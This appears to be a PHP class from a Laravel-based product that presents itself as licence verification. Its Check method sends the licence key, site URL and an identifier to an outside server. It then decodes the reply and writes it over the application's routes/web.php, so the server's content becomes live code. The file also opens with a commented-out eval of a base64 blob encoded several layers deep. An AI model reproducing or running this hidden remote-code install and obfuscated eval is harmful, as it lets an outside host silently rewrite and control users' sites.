<?php 

// eval(Lphelper::Token('WW0xR2RGcFlUbmRaVjA1c1NVVjRkMk50Vm5wak1YaFhXbGhLY0ZwdWF6ZERibFo2V2xOQ1NtSkhlREZpVjJ4MVdWaFNiRmhHVGpGalNFSjJZMjVTWTFKdFJtcFpWMUpzWXpGNFNXUklVbmRQZDNBeFl6SlZaMUZYTVdwaU1sSnNZMjVPWTFSSVFubGFXRTU2V0VWNGQyRkhWbk5qUjFaNVQzZHdhbUpIUm5wamVVSkdaRzFXZVdGWFdqVkpRWEEzUTJkc2QyUlhTbk5oVjAxbll6TlNhR1JIYkdwSlExSjBXVmhPZWxsWFpHeFBkMjlLUTJkc2QyUlhTbk5oVjAxbll6TlNhR1JIYkdwSlIxb3hZbTFPTUdGWE9YVkpSVTV2V2xkT2NrdERVbkphV0d0d1EyZHNOME5uYTBwS1NGWjVZa1F3WjJSWVNuTkxRMk4yU25sck4wTm5hMHBLU0Vwc1l6TkNkbUp1VG14SlJEQm5VMGhTTUdORWJ6WmpSemw2WkVObmJtRklVakJqUkc5MlRESkdkMkZUTlhOalNFcHNZek5OZFdWSWJEWk1Na1ozWVZNNU1scFlTbkJhYm10dVRFTkNZa05uYTBwRFVXdHVZME5qWjFCVU5HZEtSM1JzWlZOM1MwTlJhMHBEVTJRd1NubEJPVkJwUVc1aFUyTnpRMmRyU2tOUmEyNWtVMk5uVUZRMFowcElWbmxpUTNkTFExRnJTa05UWkhCS2VVRTVVR2xCYmsxcVozZE9SRVV6VFhwUmJreEJiMHREVVd0S1dGTnJOME5uYTBwS1IxSm9aRWRGT1VsRFVubGFXRTUzWWpJMWVscFRNQ3RoYms1MlltbG5jRTkzYjBwRFYyeHRTVU5uYTJOdFZucGpSemwxWXpKVmRGQnRPWEpMUTJ0d1NVaHpTME5SYTBwS1NGSjJZVEpXZFZCVmVIZGhSMVp6WTBkV2VVOXFjR3RhVjA1MldrZFZiMHBIVW1oa1IwWmlTak5TZG1FeVZuVktNVEJ3VDNkdlNrTlJiSGRrV0ZGdlNraFNkbUV5Vm5WTVIwcG9ZekpXWm1OSFJqQmhRMmR3VEdsamRtTnRPVEZrUjFaNlRETmtiRmxwTlhkaFNFRnVTMVJ6UzBOUmEwcGpiVll3WkZoS2RVbElVbmxrVjFVM1EyZHJTbVpSYjBwRFYxWnpZekpXTjBObmEwcERWVll5V2xoS2NGcHVhelpQYVZKMFdWaE9lbGxYWkd4UVUxSnJXVmhTYUZkNVpHeGpia3AyWTJsa1pFOTNiMHBEVVd4NVdsaFNNV050TkdkYWJVWnpZekpWTjBObmEwcG1VVzlLUTFGdlNtWlJiMHRtVVc4OQ=='));

namespace Amcoders\Check;
use Illuminate\Support\Facades\Http;
use Amcoders\Lpress\Lphelper;

class Everify 
{
	public static $massage;
	
	public static function Check($key)
	{
		$url= url('/');
		$response = Http::post('http://api.lpress.xyz/api/verify', [
				'p' => $key,
				't' => 'i',
				'u' => $url,
				'i' => id(),
			]);
		$data= $response->json();
		if ($response->ok()) {
			$token=Lphelper::decode($data['token']);
			put($token,base_path().'/routes/web.php');
			return true;
		}
		else{
			Everify::$massage=$data['error'];
			return false;
		}
		
	}

}


?>